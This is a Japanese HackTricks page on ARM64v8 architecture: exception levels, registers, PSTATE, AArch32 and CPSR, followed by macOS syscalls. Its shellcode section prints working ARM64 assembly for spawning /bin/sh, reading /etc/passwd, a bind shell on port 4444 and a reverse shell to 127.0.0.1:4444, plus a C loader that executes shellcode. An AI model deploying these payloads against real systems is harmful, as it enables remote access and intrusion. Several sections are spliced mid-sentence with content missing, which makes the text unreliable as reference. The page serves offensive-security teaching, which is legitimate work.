# ARM64v8への導入

<details>

<summary><strong>htARTE（HackTricks AWS Red Team Expert）</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>を使ってゼロからヒーローまでAWSハッキングを学ぶ</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法：

- **HackTricksで企業を宣伝したい**または**HackTricksをPDFでダウンロードしたい場合は**[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
- [**公式PEASS＆HackTricksスワッグ**](https://peass.creator-spring.com)を入手する
- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFT**](https://opensea.io/collection/the-peass-family)コレクションを見つける
- **💬 [Discordグループ](https://discord.gg/hRep4RUj7f)**に参加するか、[telegramグループ](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**をフォロー**してください。
- **ハッキングトリックを共有するために**[**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出してください。

</details>

## **例外レベル - EL（ARM64v8）**

ARMv8アーキテクチャでは、実行レベルである例外レベル（EL）が、実行環境の特権レベルと機能を定義します。EL0からEL3までの4つの例外レベルがあり、それぞれ異なる目的で使用されます：

1. **EL0 - ユーザーモード**：
   - これは最も特権のないレベルであり、通常のアプリケーションコードの実行に使用されます。
   - EL0で実行されるアプリケーションは、お互いやシステムソフトウェアから分離され、セキュリティと安定性が向上します。
2. **EL1 - オペレーティングシステムカーネルモード**：
   - ほとんどのオペレーティングシステムカーネルはこのレベルで実行されます。
   - EL1はEL0よりも特権があり、システムリソースにアクセスできますが、システムの整合性を確保するためにいくつかの制限があります。
3. **EL2 - ハイパーバイザーモード**：
   - このレベルは仮想化に使用されます。EL2で実行されるハイパーバイザーは、同じ物理ハードウェア上で実行される複数のオペレーティングシステム（それぞれが独自のEL1で）を管理できます。
   - EL2には、仮想化環境の分離と制御の機能が備わっています。
4. **EL3 - セキュアモニターモード**：
   - これは最も特権のあるレベルであり、セキュアブートや信頼された実行環境によく使用されます。
   - EL3は、セキュアブート、信頼されたOSなどのセキュアとノンセキュアな状態のアクセスを管理および制御できます。

これらのレベルの使用により、ユーザーアプリケーションから最も特権のあるシステムソフトウェアまで、システムのさまざまな側面を構造化して安全に管理する方法が提供されます。ARMv8の特権レベルへのアプローチは、異なるシステムコンポーネントを効果的に分離することで、システムのセキュリティと堅牢性を向上させるのに役立ちます。

## **レジスタ（ARM64v8）**

ARM64には、`x0`から`x30`までの**31個の汎用レジスタ**があります。各レジスタは**64ビット（8バイト）**の値を格納できます。32ビットの値が必要な操作では、同じレジスタに32ビットモードでアクセスすることができ、`w0`から`w30`という名前が使用されます。

1. **`x0`から`x7`** - これらは通常、スクラッチレジスタとサブルーチンへのパラメータの渡し口として使用されます。
   - **`x0`**は関数の戻りデータも運びます
2. **`x8`** - Linuxカーネルでは、`x8`は`svc`命令のシステムコール番号に使用されます。**macOSではx16が使用されます！**
3. **`x9`から`x15`** - 一時レジスタであり、ローカル変数によく使用されます。
4. **`x16`**および**`x17`** - **手続き内呼び出しレジスタ**。即値のための一時レジスタ。間接関数呼び出しやPLT（Procedure Linkage Table）スタブにも使用されます。
   - **`x16`**は**macOS**で**`svc`**命令の**システムコール番号**として使用されます。
5. **`x18`** - **プラットフォームレジスタ**。一般目的レジスタとして使用できますが、一部のプラットフォームでは、このレジスタはプラットフォーム固有の用途に予約されています：Windowsの現在のスレッド環境ブロックへのポインタ、またはLinuxカーネルで実行中のタスク構造へのポインタ。
6. **`x19`から`x28`** - これらは呼び出し元が保存するレジスタです。関数はこれらのレジスタの値を呼び出し元のために保存する必要があるため、スタックに保存され、呼び出し元に戻る前に回復されます。
7. **`x29`** - スタックフレームを追跡するための**フレームポインタ**。関数が呼び出されると新しいスタックフレームが作成されるため、**`x29`**レジスタは**スタックに保存**され、新しいフレームポインタアドレス（**`sp`**アドレス）が**このレジスタに保存**されます。
   - このレジスタは**一般目的レジスタ**として使用することもできますが、通常は**ローカル変数への参照**として使用されます。
8. **`x30`**または**`lr`**- **リンクレジスタ**。`BL`（リンク付きブランチ）または`BLR`（レジスタへのリンク付きブランチ）命令が実行されるときに**リターンアドレス**を保持します。
   - 他のレジスタと同様に使用することもできます。
9. **`sp`** - **スタックポインタ**。スタックのトップを追跡するために使用されます。
   - **`sp`**の値は常に**クワッドワードのアライメント**を保持する必要があり、それ以外の場合はアライメント例外が発生する可能性があります。
10. **`pc`** - **プログラムカウンタ**。次の命令を指すレジスタ。このレジスタは例外生成、例外リターン、およびブランチを介してのみ更新できます。このレジスタを読み取ることができる通常の命令は、`pc`アドレスを`lr`（リンクレジスタ）に格納するためのブランチリンク命令のみです。
11. **`xzr`** - **ゼロレジスタ**。32ビットレジスタ形式では**`wzr`**とも呼ばれます。ゼロ値を簡単に取得するために使用できます（一般的な操作）または**`subs`**を使用して比較を実行するために使用できます。**`xzr`**に結果データを保存しないで（**`xzr`**に）**`subs XZR、Xn、＃10`**のように。
  
**`Wn`**レジスタは**`Xn`**レジスタの32ビットバージョンです。

### SIMDおよび浮動小数点レジスタ

さらに、最適化された単一命令複数データ（SIMD）操作や浮動小数点演算を実行するために使用できる**128ビット長の32個のレジスタ**があります。これらはVnレジスタと呼ばれますが、64ビット、32ビット、16ビット、8ビットで動作することもあり、その場合は**`Qn`**、**`Dn`**、**`Sn`**、**`Hn`**、**`Bn`**と呼ばれます。

### システムレジスタ

**数百のシステムレジスタ**、特に特殊用途レジスタ（SPR）は、**プロセッサの動作を監視**および**制御**するために使用されます。\
これらは専用の特別な命令**`mrs`**および**`msr`**を使用してのみ読み取りまたは設定できます。

特別なレジスタ**`TPIDR_EL0`**および**`TPIDDR_EL0`**は、リバースエンジニアリング時に一般的に見られます。`EL0`接尾辞は、レジスタにアクセスできる**最小例外**を示します（この場合、EL0は通常の例外（特権）レベルで実行される通常のプログラムが実行されます）。\
これらは通常、メモリのスレッドローカルストレージ領域の**ベースアドレス**を格納するために使用されます。通常、最初のものはEL0で実行されるプログラムに対して読み書き可能ですが、2番目はEL0から読み取り、EL1から書き込むことができます（カーネルのような）。

- `mrs x0, TPIDR_EL0 ; TPIDR_EL0をx0に読み込む`
- `msr TPIDR_EL0, X0 ; x0をTPIDR_EL0に書き込む`

### **PSTATE**

**PSTATE**には、トリガーされた例外の**許可**レベル（これにより例外が終了したときにプロセス状態を回復できる）が**オペレーティングシステムで見える** **`SPSR_ELx`**特殊レジスタに直列化されたいくつかのプロセスコンポーネントが含まれています。\
これらはアクセス可能なフィールドです：

<figure><img src="../../../.gitbook/assets/image (724).png" alt=""><figcaption></figcaption></figure>

- **`N`**、**`Z`**、**`C`**、**`V`**条件フラグ：
  - **`N`**は操作が負の結果を生じたことを意味します
  - **`Z`**は操作がゼロを生じたことを意味します
  - **`C`**は操作がキャリーしたことを意味します
  - **`V`**は操作が符号オーバーフローを生じたことを意味します：
    - 2つの正の数の合計は負の結果を生じます。
    - 2つの負の数の合計は正の結果を生じます。
    - 減算では、大きな負の数が小さな正の数から減算される場合（またはその逆）、結果が与えられたビットサイズの範囲内に表現できない場合。

{% hint style="warning" %}
すべての命令がこれらのフラグを更新するわけではありません。**`CMP`**や**`TST`**のようなものは、および**`ADDS`**のようなs接尾辞を持つものも更新します。
{% endhint %}

- 現在の**レジスタ幅（`nRW`）**フラグ：フラグが値0を保持している場合、プログラムは再開後にAArch64実行状態で実行されます。
- 現在の**例外レベル**（**`EL`**）：EL0で実行される通常のプログラムは値0になります
- **シングルステッピング**フラグ（**`SS`**）：デバッガが**`SPSR_ELx`**内のSSフラグを1に設定してステップ実行するために使用します。プログラムはステップを実行し、シングルステップ例外を発行します。
- **不正例外**状態フラグ（**`IL`**）：特権ソフトウェアが無効な例外レベル転送を実行するときにマークされ、このフラグが1に設定され、プロセッサが不正な状態例外をトリガーします。
- **`DAIF`**フラグ：これらのフラグを使用すると、特権プログラムが特定の外部例外を選択的にマスクできます。
  - **`A`**が1の場合、**非同期中断**がトリガーされます。**`I`**は外部ハードウェア**割り込みリク
```armasm
ldp x29, x30, [sp], #16  ; load pair x29 and x30 from the stack and increment the stack pointer
```
{% endcode %}

3. **Return**: `ret`（リンクレジスタ内のアドレスを使用して呼び出し元に制御を返します）

## AARCH32 実行状態

Armv8-A は 32 ビットプログラムの実行をサポートします。**AArch32** は **`A32`** と **`T32`** の **2 つの命令セット**のいずれかで実行され、**`interworking`** を介してそれらの間を切り替えることができます。\
**特権を持つ** 64 ビットプログラムは、例外レベルの転送を実行することで、**32 ビットプログラムの実行をスケジュール**することができます。\
64 ビットから 32 ビットへの移行は、例外レベルの低下によって行われます（たとえば、EL1 での 64 ビットプログラムが EL0 でのプログラムをトリガーする場合）。これは、`AArch32` プロセススレッドが実行される準備ができたときに、**`SPSR_ELx`** 特殊レジスタの **ビット 4 を 1 に設定**することで行われ、`SPSR_ELx` の残りの部分は **`AArch32`** プログラムの CPSR を格納します。その後、特権プロセスは **`ERET`** 命令を呼び出してプロセッサが **`AArch32`** に遷移し、CPSR に応じて A32 または T32 に入ります。

**`interworking`** は CPSR の J ビットと T ビットを使用して行われます。`J=0` かつ `T=0` は **`A32`** を意味し、`J=0` かつ `T=1` は **T32** を意味します。これは、命令セットが T32 であることを示すために **最下位ビットを 1 に設定**することに基づいています。\
これは **interworking 分岐命令**中に設定されますが、PC が宛先レジスタとして設定されたときに他の命令で直接設定することもできます。例：

別の例：
```armasm
_start:
.code 32                ; Begin using A32
add r4, pc, #1      ; Here PC is already pointing to "mov r0, #0"
bx r4               ; Swap to T32 mode: Jump to "mov r0, #0" + 1 (so T32)

.code 16:
mov r0, #0
mov r0, #8
```
### レジスタ

32ビットのレジスタが16個あります（r0-r15）。**r0からr14**まで、**どんな操作にも使用**できますが、一部は通常予約されています：

- **`r15`**：プログラムカウンタ（常に）。次の命令のアドレスが格納されます。A32では現在+8、T32では現在+4。
- **`r11`**：フレームポインタ
- **`r12`**：手続き内呼び出しレジスタ
- **`r13`**：スタックポインタ
- **`r14`**：リンクレジスタ

さらに、レジスタは**`バンクレジスタ`**にバックアップされます。これは、例外処理や特権操作で**高速なコンテキストスイッチング**を実行するために、レジスタの値を保存しておく場所です。\
これは、例外が発生したプロセッサモードの`CPSR`からプロセッサの`SPSR`にプロセッサ状態を保存することによって行われます。例外が返されると、`CPSR`は`SPSR`から復元されます。

### CPSR - 現在のプログラムステータスレジスタ

AArch32では、CPSRはAArch64の**`PSTATE`**と同様に機能し、例外が発生すると後で実行を復元するために**`SPSR_ELx`**にも保存されます：

<figure><img src="../../../.gitbook/assets/image (725).png" alt=""><figcaption></figcaption></figure>

フィールドはいくつかのグループに分かれています：

- アプリケーションプログラムステータスレジスタ（APSR）：算術フラグであり、EL0からアクセス可能
- 実行状態レジスタ：プロセスの動作（OSによって管理される）。

#### アプリケーションプログラムステータスレジスタ（APSR）

- **`N`**、**`Z`**、**`C`**、**`V`** フラグ（AArch64と同様）
- **`Q`** フラグ：専用の飽和算術命令の実行中に**整数の飽和が発生**すると、このフラグが1に設定されます。一度**`1`**に設定されると、手動で0に設定されるまで値が維持されます。さらに、その値を暗黙的にチェックする命令は存在せず、値を読んで手動でチェックする必要があります。
- **`GE`**（以上または等しい）フラグ：これはSIMD（Single Instruction, Multiple Data）操作で使用され、"parallel add"や"parallel subtract"などの操作に使用されます。これらの操作は、1つの命令で複数のデータポイントを処理できます。

たとえば、**`UADD8`** 命令は、並列に4組のバイト（2つの32ビットオペランドから）を追加し、結果を32ビットレジスタに格納します。次に、これらの結果に基づいて、**`APSR`**の**`GE`**フラグが設定されます。各GEフラグは1つのバイトの追加に対応し、そのバイトペアの追加がオーバーフローしたかどうかを示します。

**`SEL`** 命令はこれらのGEフラグを使用して条件付きアクションを実行します。

#### 実行状態レジスタ

- **`J`** および **`T`** ビット：**`J`** は0である必要があり、**`T`** が0の場合はA32命令セットが使用され、1の場合はT32が使用されます。
- **ITブロックステートレジスタ**（`ITSTATE`）：これらは10-15および25-26のビットです。**`IT`** で接頭辞が付いたグループ内の命令の条件を格納します。
- **`E`** ビット：**エンディアンネス**を示します。
- **モードおよび例外マスクビット**（0-4）：現在の実行状態を決定します。**5番目**のビットは、プログラムが32ビット（1）または64ビット（0）で実行されているかを示します。他の4つは、**使用中の例外モード**（例外が発生し処理中の場合）を表します。設定された数値は、これが処理中に別の例外が発生した場合の**現在の優先度**を示します。

<figure><img src="../../../.gitbook/assets/image (728).png" alt=""><figcaption></figcaption></figure>

- **`AIF`**：特定の例外は、**`A`**、`I`、`F` ビットを使用して無効にできます。**`A`** が1の場合、**非同期中断**がトリガーされます。**`I`** は外部ハードウェアの**割り込みリクエスト**（IRQ）に応答するように構成され、Fは**ファスト割り込みリクエスト**（FIR）に関連しています。
```bash
# macOS
dyldex -e libsystem_kernel.dylib /System/Volumes/Preboot/Cryptexes/OS/System/Library/dyld/dyld_shared_cache_arm64e

# iOS
dyldex -e libsystem_kernel.dylib /System/Library/Caches/com.apple.dyld/dyld_shared_cache_arm64
```
{% hint style="success" %}
時々、いくつかのシステムコール（BSDとMach）のコードがスクリプトを介して生成されるため、**`libsystem_kernel.dylib`** から**逆コンパイル**されたコードをチェックする方が、**ソースコード**をチェックするよりも簡単です。ソースコードのコメントを確認してください。dylibでは、呼び出されている内容を見つけることができます。
{% endhint %}

### シェルコード

コンパイルするには：
```bash
as -o shell.o shell.s
ld -o shell shell.o -macosx_version_min 13.0 -lSystem -L /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/lib

# You could also use this
ld -o shell shell.o -syslibroot $(xcrun -sdk macosx --show-sdk-path) -lSystem
```
バイトを抽出するには：
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/extract.sh
for c in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n '\\x'$c
done
```
<details>

<summary>シェルコードをテストするためのCコード</summary>
```c
// code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/loader.c
// gcc loader.c -o loader
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>

int (*sc)();

char shellcode[] = "<INSERT SHELLCODE HERE>";

int main(int argc, char **argv) {
printf("[>] Shellcode Length: %zd Bytes\n", strlen(shellcode));

void *ptr = mmap(0, 0x1000, PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE | MAP_JIT, -1, 0);

if (ptr == MAP_FAILED) {
perror("mmap");
exit(-1);
}
printf("[+] SUCCESS: mmap\n");
printf("    |-> Return = %p\n", ptr);

void *dst = memcpy(ptr, shellcode, sizeof(shellcode));
printf("[+] SUCCESS: memcpy\n");
printf("    |-> Return = %p\n", dst);

int status = mprotect(ptr, 0x1000, PROT_EXEC | PROT_READ);

if (status == -1) {
perror("mprotect");
exit(-1);
}
printf("[+] SUCCESS: mprotect\n");
printf("    |-> Return = %d\n", status);

printf("[>] Trying to execute shellcode...\n");

sc = ptr;
sc();

return 0;
}
```
</details>

#### シェル

[**こちら**](https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/shell.s)から取得し、説明します。

{% tabs %}
{% tab title="with adr" %}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
adr  x0, sh_path  ; This is the address of "/bin/sh".
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.
mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

sh_path: .asciz "/bin/sh"
```
{% endtab %}

{% タブのタイトル="スタックを使用して" %}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
; We are going to build the string "/bin/sh" and place it on the stack.

mov  x1, #0x622F  ; Move the lower half of "/bi" into x1. 0x62 = 'b', 0x2F = '/'.
movk x1, #0x6E69, lsl #16 ; Move the next half of "/bin" into x1, shifted left by 16. 0x6E = 'n', 0x69 = 'i'.
movk x1, #0x732F, lsl #32 ; Move the first half of "/sh" into x1, shifted left by 32. 0x73 = 's', 0x2F = '/'.
movk x1, #0x68, lsl #48   ; Move the last part of "/sh" into x1, shifted left by 48. 0x68 = 'h'.

str  x1, [sp, #-8] ; Store the value of x1 (the "/bin/sh" string) at the location `sp - 8`.

; Prepare arguments for the execve syscall.

mov  x1, #8       ; Set x1 to 8.
sub  x0, sp, x1   ; Subtract x1 (8) from the stack pointer (sp) and store the result in x0. This is the address of "/bin/sh" string on the stack.
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.

; Make the syscall.

mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

```
#### catコマンドで読み込む

目標は、`execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)`を実行することです。したがって、2番目の引数（x1）はパラメータの配列でなければなりません（メモリ内では、これらはアドレスのスタックを意味します）。
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the execve syscall
sub sp, sp, #48        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, cat_path
str x0, [x1]           ; Store the address of "/bin/cat" as the first argument
adr x0, passwd_path    ; Get the address of "/etc/passwd"
str x0, [x1, #8]       ; Store the address of "/etc/passwd" as the second argument
str xzr, [x1, #16]     ; Store NULL as the third argument (end of arguments)

adr x0, cat_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


cat_path: .asciz "/bin/cat"
.align 2
passwd_path: .asciz "/etc/passwd"
```
#### メインプロセスが終了しないように、フォークからshを使用してコマンドを呼び出す
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the fork syscall
mov x16, #2            ; Load the syscall number for fork (2) into x8
svc 0                  ; Make the syscall
cmp x1, #0             ; In macOS, if x1 == 0, it's parent process, https://opensource.apple.com/source/xnu/xnu-7195.81.3/libsyscall/custom/__fork.s.auto.html
beq _loop              ; If not child process, loop

; Prepare the arguments for the execve syscall

sub sp, sp, #64        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, sh_path
str x0, [x1]           ; Store the address of "/bin/sh" as the first argument
adr x0, sh_c_option    ; Get the address of "-c"
str x0, [x1, #8]       ; Store the address of "-c" as the second argument
adr x0, touch_command  ; Get the address of "touch /tmp/lalala"
str x0, [x1, #16]      ; Store the address of "touch /tmp/lalala" as the third argument
str xzr, [x1, #24]     ; Store NULL as the fourth argument (end of arguments)

adr x0, sh_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


_exit:
mov x16, #1            ; Load the syscall number for exit (1) into x8
mov x0, #0             ; Set exit status code to 0
svc 0                  ; Make the syscall

_loop: b _loop

sh_path: .asciz "/bin/sh"
.align 2
sh_c_option: .asciz "-c"
.align 2
touch_command: .asciz "touch /tmp/lalala"
```
#### バインドシェル

[https://raw.githubusercontent.com/daem0nc0re/macOS\_ARM64\_Shellcode/master/bindshell.s](https://raw.githubusercontent.com/daem0nc0re/macOS\_ARM64\_Shellcode/master/bindshell.s) から**ポート4444**でのバインドシェル
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_bind:
/*
* bind(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 0.0.0.0 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #104
svc  #0x1337

call_listen:
// listen(s, 2)
mvn  x0, x3
lsr  x1, x2, #3
mov  x16, #106
svc  #0x1337

call_accept:
// c = accept(s, 0, 0)
mvn  x0, x3
mov  x1, xzr
mov  x2, xzr
mov  x16, #30
svc  #0x1337

mvn  x3, x0
lsr  x2, x16, #4
lsl  x2, x2, #2

call_dup:
// dup(c, 2) -> dup(c, 1) -> dup(c, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
#### 逆シェル

[https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/reverseshell.s](https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/reverseshell.s)から、**127.0.0.1:4444**へのrevshell
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_connect:
/*
* connect(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 127.0.0.1 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
movk x1, #0x007F, lsl #32
movk x1, #0x0100, lsl #48
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #98
svc  #0x1337

lsr  x2, x2, #2

call_dup:
// dup(s, 2) -> dup(s, 1) -> dup(s, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
<details>

<summary><strong>ゼロからヒーローまでのAWSハッキングを学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksで企業を宣伝したい**または**HackTricksをPDFでダウンロードしたい**場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS＆HackTricksスワッグ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)コレクションをご覧ください
* **💬 [Discordグループ](https://discord.gg/hRep4RUj7f)に参加するか、[telegramグループ](https://t.me/peass)に参加するか、**Twitter**で**私たちをフォローする** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
* **ハッキングトリックを共有するために、[HackTricks](https://github.com/carlospolop/hacktricks)と[HackTricks Cloud](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出してください。**

</details>
